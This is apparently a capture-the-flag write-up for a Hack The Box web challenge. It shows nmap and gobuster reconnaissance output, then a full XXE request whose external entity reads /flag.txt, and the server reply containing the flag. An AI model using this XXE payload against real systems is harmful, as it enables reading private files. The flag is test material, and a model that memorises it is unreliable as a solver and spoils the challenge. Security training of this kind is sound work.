# Jailbreak
The crew secures an experimental Pip-Boy from a black market merchant, recognizing its potential to unlock the heavily guarded bunker of Vault 79. Back at their hideout, the hackers and engineers collaborate to jailbreak the device, working meticulously to bypass its sophisticated biometric locks. Using custom firmware and a series of precise modifications, can you bring the device to full operational status in order to pair it with the vault door's access port. The flag is located in /flag.txt

# Results:
```sh
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sV -p 33183 83.136.248.18

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-20 11:55 EDT
Nmap scan report for 83-136-248-18.uk-lon1.upcloud.host (83.136.248.18)
Host is up (0.023s latency).

PORT      STATE SERVICE VERSION
33183/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33183-TCP:V=7.94SVN%I=7%D=5/20%Time=664B726B%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,6B36,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.
SF:3\x20Python/3\.12\.3\r\nDate:\x20Mon,\x2020\x20May\x202024\x2015:55:22\
SF:x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Lengt
SF:h:\x2027270\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x2
SF:0lang=\"en\"\x20dir=\"ltr\">\n\x20\x20<head>\n\x20\x20\x20\x20<meta\x20
SF:charset=\"utf-8\">\n\x20\x20\x20\x20<title>PIP-OS\(R\)\x20V1\.33\.7</ti
SF:tle>\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=dev
SF:ice-width,\x20initial-scale=1\">\n\x20\x20\x20\x20<link\x20rel=\"styles
SF:heet\"\x20href=\"/static/css/bootstrap\.min\.css\">\n\x20\x20\x20\x20<l
SF:ink\x20rel=\"stylesheet\"\x20href=\"/static/css/pipboy\.app\.css\">\n\x
SF:20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/menu\.c
SF:ss\">\n\n\x20\x20\x20\x20<link\x20rel=\"icon\"\x20type=\"image/png\"\x2
SF:0href=\"/static/images/favicon\.png\"\x20/>\n\x20\x20</head>\n\x20\x20<
SF:body>\n\x20\x20\x20\x20<nav\x20class=\"navbar\x20navbar-expand-lg\x20na
SF:vbar-light\x20bg-light\x20first-navbar\">\n\x20\x20\x20\x20\x20\x20<but
SF:ton\x20class=\"navbar-toggler\"\x20type=\"button\"\x20data-toggle=\"col
SF:lapse\"\x20data-target=\"#navbar-SupportedContent\"\x20aria-expanded=\"
SF:false\"\x20aria-label=\"Toggle-navigation\"></button>\n\x20\x20\x20\x20
SF:")%r(HTTPOptions,C7,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0
SF:\.3\x20Python/3\.12\.3\r\nDate:\x20Mon,\x2020\x20May\x202024\x2015:55:2
SF:2\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20O
SF:PTIONS,\x20HEAD,\x20GET\r\nContent-Length:\x200\r\nConnection:\x20close
SF:\r\n\r\n")%r(RTSPRequest,16C,"<!DOCTYPE\x20HTML>\n<html\x20lang=\"en\">
SF:\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20char
SF:set=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20respons
SF:e</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x2
SF:0\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<p>Message:\x20Bad\x20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20400\x2
SF:0-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x
SF:20\x20\x20\x20</body>\n</html>\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.84 seconds

```

```sh
┌──(kali㉿kali)-[~/Desktop]
└─$ gobuster dir -u http://83.136.248.18:33183  -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://83.136.248.18:33183
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/data                 (Status: 200) [Size: 6908]
/inventory            (Status: 200) [Size: 6573]
/map                  (Status: 200) [Size: 2246]
/radio                (Status: 200) [Size: 7281]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================

```

![[VirtualBoxVM_VXigBkNPlU.png]]
XXE attack.

```sh
POST /api/update HTTP/1.1

Host: 94.237.49.212:48636

Content-Length: 1414

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36

Content-Type: application/xml

Accept: */*

Origin: http://94.237.49.212:48636

Referer: http://94.237.49.212:48636/rom

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Connection: close



<!--?xml version="1.0" ?-->

<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///flag.txt"> ]>



<FirmwareUpdateConfig>
    <Firmware>
        <Version>&ent;</Version>
        <ReleaseDate>2077-10-21</ReleaseDate>
        <Description>Update includes advanced biometric lock functionality for enhanced security.</Description>
        <Checksum type="SHA-256">9b74c9897bac770ffc029102a200c5de</Checksum>
    </Firmware>
    <Components>
        <Component name="navigation">
            <Version>3.7.2</Version>
            <Description>Updated GPS algorithms for improved wasteland navigation.</Description>
            <Checksum type="SHA-256">e4d909c290d0fb1ca068ffaddf22cbd0</Checksum>
        </Component>
        <Component name="communication">
            <Version>4.5.1</Version>
            <Description>Enhanced encryption for secure communication channels.</Description>
            <Checksum type="SHA-256">88d862aeb067278155c67a6d6c0f3729</Checksum>
        </Component>
        <Component name="biometric_security">
            <Version>2.0.5</Version>
            <Description>Introduces facial recognition and fingerprint scanning for access control.</Description>
            <Checksum type="SHA-256">abcdef1234567890abcdef1234567890</Checksum>
        </Component>
    </Components>
    <UpdateURL>https://satellite-updates.hackthebox.org/firmware/1.33.7/download</UpdateURL>
</FirmwareUpdateConfig>
```

```sh
HTTP/1.1 200 OK

Server: Werkzeug/3.0.3 Python/3.12.3

Date: Thu, 23 May 2024 19:05:04 GMT

Content-Type: application/json

Content-Length: 130

Connection: close



{
  "message": "Firmware version HTB{b1om3tric_l0cks_4nd_fl1cker1ng_l1ghts_1779b8dde2ad832f801ef5f671ea7811} update initiated."
}

```